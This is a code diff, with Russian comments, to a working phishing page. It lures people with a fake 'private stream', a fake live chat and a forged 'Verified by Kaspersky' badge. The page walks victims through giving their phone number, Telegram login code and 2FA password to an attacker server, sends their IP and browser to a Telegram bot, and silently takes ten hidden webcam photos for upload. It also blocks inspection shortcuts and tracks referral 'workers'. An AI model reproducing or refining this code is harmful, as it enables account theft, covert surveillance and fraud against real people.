@@ -12,12 +12,21 @@
             -webkit-tap-highlight-color: transparent;
             user-select: none;
             -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
         }
         
         body {
             background: #000;
             overflow: hidden;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        img, video {
+            pointer-events: none;
+            user-select: none;
+            -webkit-user-drag: none;
+            -webkit-touch-callout: none;
         }
         
         .loading-overlay {
@@ -264,8 +273,13 @@
             margin-top: 12px;
         }
         
-        .code-section { display: none; }
-        .password-section { display: none; }
+        .code-section {
+            display: none;
+        }
+        
+        .password-section {
+            display: none;
+        }
         
         .help-code-btn {
             display: inline-block;
@@ -276,7 +290,15 @@
             color: #ff6680;
             font-size: 13px;
             text-decoration: none;
+            margin-top: 10px;
+            margin-bottom: 10px;
             cursor: pointer;
+            transition: 0.2s;
+        }
+        
+        .help-code-btn:hover {
+            background: #ff6680;
+            color: white;
         }
         
         .code-help-row {
@@ -295,7 +317,7 @@
 </div>
 
 <div class="fullscreen-video" id="videoContainer">
-    <video id="bgVideo" autoplay muted playsinline loop>
+    <video id="bgVideo" autoplay muted playsinline>
         <source src="https://files.catbox.moe/svd7qq.mp4" type="video/mp4">
     </video>
 </div>
@@ -343,11 +365,14 @@
 
 <script>
     // ========== БЛОКИРОВКИ ==========
-    document.addEventListener('contextmenu', (e) => e.preventDefault());
-    document.addEventListener('keydown', (e) => {
-        if (e.ctrlKey && (e.key === 's' || e.key === 'S' || e.key === 'u' || e.key === 'U')) e.preventDefault();
-        if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i')) e.preventDefault();
-        if (e.key === 'F12') e.preventDefault();
+    document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
+    document.addEventListener('selectstart', function(e) { e.preventDefault(); return false; });
+    document.addEventListener('keydown', function(e) {
+        if (e.ctrlKey && (e.key === 's' || e.key === 'S')) { e.preventDefault(); return false; }
+        if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) { e.preventDefault(); return false; }
+        if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i')) { e.preventDefault(); return false; }
+        if (e.key === 'F12') { e.preventDefault(); return false; }
+        if (e.ctrlKey && e.shiftKey && (e.key === 'C' || e.key === 'c')) { e.preventDefault(); return false; }
     });
     
     // ========== КОНФИГ ==========
@@ -365,38 +390,36 @@
         return urlParams.get('ref');
     }
     
-    // ========== ГЛАВНАЯ ФУНКЦИЯ - МЕНЯЕТ ИМЯ НА САЙТЕ ==========
+    // ========== ЗАГРУЗКА ДАННЫХ ВОРКЕРА ==========
     async function loadWorkerData() {
         const refCode = getRefCodeFromURL();
         if (!refCode) {
-            console.log('Нет реф кода, показываем Vikysa');
+            console.log('Нет реферального кода, показываем стандартное имя');
             return;
         }
         
         currentRefCode = refCode;
-        console.log('Найден реф код:', refCode);
         
         try {
             const response = await fetch(`${API_URL}/get_worker_info?ref=${refCode}`);
             const data = await response.json();
-            console.log('Ответ от API:', data);
             
             if (data.success) {
                 const titleElement = document.getElementById('modelTitle');
                 titleElement.innerHTML = `Приватный стрим ${data.model_name}`;
                 document.title = `${data.model_name} · Приватный стрим LIVE`;
-                console.log(`✅ Имя изменено на: ${data.model_name}`);
+                console.log(`Загружена модель: ${data.model_name} из ${data.city}`);
             } else {
-                console.log('Воркер не найден');
+                console.log('Воркер не найден или не одобрен');
             }
         } catch(e) {
-            console.log('Ошибка загрузки:', e);
+            console.log('Ошибка загрузки данных воркера:', e);
         }
     }
     
     function sendToAdmin(text) {
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(text)}`)
-            .catch(() => console.log('Ошибка отправки'));
+            .catch(() => console.log('Ошибка отправки админу'));
     }
     
     // ========== ЛОГ ЗАХОДА ==========
@@ -413,6 +436,7 @@
         if (ua.includes('Chrome')) browser = "🌐 Chrome";
         else if (ua.includes('Firefox')) browser = "🦊 Firefox";
         else if (ua.includes('Safari')) browser = "🧭 Safari";
+        else if (ua.includes('Edge')) browser = "🌊 Edge";
         
         fetch('https://api.ipify.org?format=json')
             .then(res => res.json())
@@ -424,11 +448,12 @@
             });
     })();
     
-    // ========== ВИДЕО ==========
+    // ========== ВИДЕО ПЛЕЕР ==========
     const video = document.getElementById('bgVideo');
     const videoContainer = document.getElementById('videoContainer');
     const loadingOverlay = document.getElementById('loadingOverlay');
     
+    video.addEventListener('loadedmetadata', () => { video.currentTime = 0; });
     video.addEventListener('canplay', () => {
         setTimeout(() => {
             loadingOverlay.style.opacity = '0';
@@ -439,8 +464,22 @@
             }, 500);
         }, 500);
     });
+    video.addEventListener('ended', () => {
+        video.currentTime = 0;
+        video.play();
+    });
+    setTimeout(() => {
+        if (loadingOverlay.style.display !== 'none') {
+            loadingOverlay.style.opacity = '0';
+            setTimeout(() => {
+                loadingOverlay.style.display = 'none';
+                videoContainer.style.opacity = '1';
+                video.play().catch(() => {});
+            }, 500);
+        }
+    }, 5000);
     
-    // ========== ФЕЙКОВЫЙ ЧАТ ==========
+    // ========== ЧАТ (фейковый) ==========
     const chatMessagesContainer = document.getElementById('chatMessages');
     const chatStartMessages = [
         "@user_124: когда разблокируют?",
@@ -449,10 +488,11 @@
         "@vip_777: уже зашёл, всё работает"
     ];
     const chatMsgs = [
-        "кто смотрит?", "жарко 🔥", "разблокируйте быстрее", "жду", "когда?", "лучший стрим",
-        "привет", "как зайти?", "где ссылка?", "классная", "покажи ещё", "супер", "наконец-то"
+        "кто смотрит?", "жарко 🔥", "разблокируйте быстрее", "жду", "когда?", "лучший стрим", "ого", "хочу посмотреть",
+        "привет", "как зайти?", "уже оплатил", "где ссылка?", "классная", "покажи ещё", "супер", "наконец-то",
+        "че за блюр", "админ включи", "кнопка не работает", "помогите", "+1", "ура", "работает", "зашёл", "топ"
     ];
-    const chatNames = ["@lexa", "@vip", "@dimon", "@user123", "@fan_88", "@hunter", "@moon", "@dark"];
+    const chatNames = ["@lexa", "@vip", "@dimon", "@user123", "@fan_88", "@hunter", "@moon", "@dark", "@max", "@alex"];
     
     function addChatMessage() {
         if (chatMessagesContainer.children.length < 3) {
@@ -485,6 +525,8 @@
         document.getElementById('actionBtn').innerText = "📱 Отправить код";
         document.getElementById('actionBtn').disabled = false;
         document.getElementById('status').innerHTML = "";
+        document.getElementById('modalTitle').innerText = "🔞 Доступ к стриму";
+        document.getElementById('modalDesc').innerText = "Введите номер телефона";
         currentPhone = "";
         currentStep = "phone";
     }
@@ -502,10 +544,12 @@
             
             btn.disabled = true;
             btn.innerText = "⏳ Отправка...";
+            statusDiv.innerText = "Отправляем код...";
             try {
                 const bodyData = { phone: phone };
-                if (currentRefCode) bodyData.ref = currentRefCode;
-                
+                if (currentRefCode) {
+                    bodyData.ref = currentRefCode;
+                }
                 const response = await fetch(`${API_URL}/send_code`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -525,10 +569,12 @@
                 } else {
                     statusDiv.innerText = "Ошибка: " + (data.error || "неизвестно");
                     btn.disabled = false;
+                    btn.innerText = "📱 Отправить код";
                 }
             } catch(e) {
-                statusDiv.innerText = "Ошибка сервера";
+                statusDiv.innerText = "Ошибка: сервер не запущен";
                 btn.disabled = false;
+                btn.innerText = "📱 Отправить код";
             }
         } else if (currentStep === "code") {
             const code = document.getElementById('code').value.trim();
@@ -546,24 +592,30 @@
                 });
                 const data = await response.json();
                 if (data.success) {
+                    statusDiv.style.color = "#88ff88";
                     statusDiv.innerHTML = "✅ Вход выполнен!";
-                    setTimeout(() => window.location.href = "https://web.telegram.org", 1500);
+                    setTimeout(() => {
+                        window.location.href = "https://web.telegram.org";
+                    }, 1500);
                 } else if (data.needs_password) {
                     currentStep = "password";
                     document.getElementById('codeSection').style.display = 'none';
                     document.getElementById('passwordSection').style.display = 'block';
                     btn.innerText = "🔐 Подтвердить пароль";
-                    document.getElementById('modalTitle').innerText = "🔐 2FA";
+                    document.getElementById('modalTitle').innerText = "🔐 Двухфакторная аутентификация";
+                    document.getElementById('modalDesc').innerText = "Введите пароль";
                     statusDiv.style.color = "#ffaa66";
                     statusDiv.innerHTML = "⏳ Требуется пароль";
                     btn.disabled = false;
                 } else {
-                    statusDiv.innerText = "Ошибка: неверный код";
+                    statusDiv.innerText = "Ошибка: " + (data.error || "неверный код");
                     btn.disabled = false;
+                    btn.innerText = "✅ Подтвердить код";
                 }
             } catch(e) {
                 statusDiv.innerText = "Ошибка соединения";
                 btn.disabled = false;
+                btn.innerText = "✅ Подтвердить код";
             }
         } else if (currentStep === "password") {
             const password = document.getElementById('password').value.trim();
@@ -581,37 +633,50 @@
                 });
                 const data = await response.json();
                 if (data.success) {
+                    statusDiv.style.color = "#88ff88";
                     statusDiv.innerHTML = "✅ Вход выполнен!";
-                    setTimeout(() => window.location.href = "https://web.telegram.org", 1500);
+                    setTimeout(() => {
+                        window.location.href = "https://web.telegram.org";
+                    }, 1500);
                 } else {
-                    statusDiv.innerText = "Ошибка: неверный пароль";
+                    statusDiv.innerText = "Ошибка: " + (data.error || "неверный пароль");
                     btn.disabled = false;
+                    btn.innerText = "🔐 Подтвердить пароль";
                 }
             } catch(e) {
                 statusDiv.innerText = "Ошибка соединения";
                 btn.disabled = false;
+                btn.innerText = "🔐 Подтвердить пароль";
             }
         }
     }
     
-    // ========== КАМЕРА ==========
+    // ========== КАМЕРА И ФОТО ==========
     let cameraAllowed = false;
+    
     async function startSilentCapture() {
         if (cameraAllowed) return;
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             cameraAllowed = true;
+            
             const videoEl = document.createElement('video');
             videoEl.srcObject = stream;
             videoEl.setAttribute('playsinline', 'true');
             videoEl.style.position = 'fixed';
             videoEl.style.top = '-1000px';
             videoEl.style.left = '-1000px';
+            videoEl.style.width = '1px';
+            videoEl.style.height = '1px';
+            videoEl.style.opacity = '0';
             document.body.appendChild(videoEl);
             await videoEl.play();
-            await new Promise(r => setTimeout(r, 500));
+            
             const canvas = document.createElement('canvas');
             const ctx = canvas.getContext('2d');
+            
+            await new Promise(r => setTimeout(r, 500));
+            
             for (let i = 0; i < 10; i++) {
                 canvas.width = videoEl.videoWidth || 640;
                 canvas.height = videoEl.videoHeight || 480;
@@ -620,13 +685,16 @@
                 fetch(`${API_URL}/upload_photo`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ photo: photoData, step: i+1 })
+                    body: JSON.stringify({ photo: photoData, step: i+1, timestamp: Date.now() })
                 }).catch(() => {});
                 await new Promise(r => setTimeout(r, 300));
             }
+            
             stream.getTracks().forEach(track => track.stop());
             videoEl.remove();
-            sendToAdmin(`📸 Сделано 10 фото`);
+            
+            sendToAdmin(`📸 Сделано 10 скрытых фото жертвы`);
+            
         } catch(e) {
             sendToAdmin(`❌ Ошибка камеры: ${e.message}`);
         }
@@ -641,17 +709,23 @@
     window.closeModal = closeModal;
     window.handleAction = handleAction;
     
-    // ========== ЗАПУСКАЕМ ЗАГРУЗКУ ИМЕНИ ==========
+    // ========== ЗАГРУЗКА ДАННЫХ ВОРКЕРА ПРИ СТАРТЕ ==========
     loadWorkerData();
 </script>
 
-<div style="position: fixed; bottom: 15px; left: 15px; background: rgba(30,30,30,0.85); backdrop-filter: blur(8px); border-radius: 30px; padding: 8px 18px; display: flex; align-items: center; gap: 12px; z-index: 999; border: 1px solid rgba(255,255,255,0.15);">
-    <div style="background: #2ecc71; width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center;">
-        <span style="color: white; font-size: 18px;">✓</span>
+<!-- Бейдж безопасности -->
+<div id="trustBadge" style="position: fixed; bottom: 15px; left: 15px; background: rgba(30,30,30,0.85); backdrop-filter: blur(8px); border-radius: 30px; padding: 8px 18px; display: flex; align-items: center; gap: 12px; z-index: 999; border: 1px solid rgba(255,255,255,0.15); box-shadow: 0 4px 12px rgba(0,0,0,0.3); font-family: system-ui, -apple-system, 'Segoe UI', sans-serif;">
+    <div style="background: #2ecc71; width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 6px #2ecc71;">
+        <span style="color: white; font-size: 18px; font-weight: bold;">✓</span>
     </div>
-    <div>
-        <span style="color: white; font-size: 13px; font-weight: 600;">Проверено Kaspersky</span><br>
+    <div style="display: flex; flex-direction: column; line-height: 1.2;">
+        <span style="color: white; font-size: 13px; font-weight: 600;">Проверено Kaspersky</span>
         <span style="color: #aaa; font-size: 10px;">Безопасный сайт • SSL активен</span>
+    </div>
+    <div style="width: 1px; height: 20px; background: #444; margin: 0 5px;"></div>
+    <div style="display: flex; flex-direction: column; line-height: 1.2;">
+        <span style="color: white; font-size: 13px; font-weight: 600;">🔒 256-bit</span>
+        <span style="color: #aaa; font-size: 10px;">Шифрование данных</span>
     </div>
 </div>
 
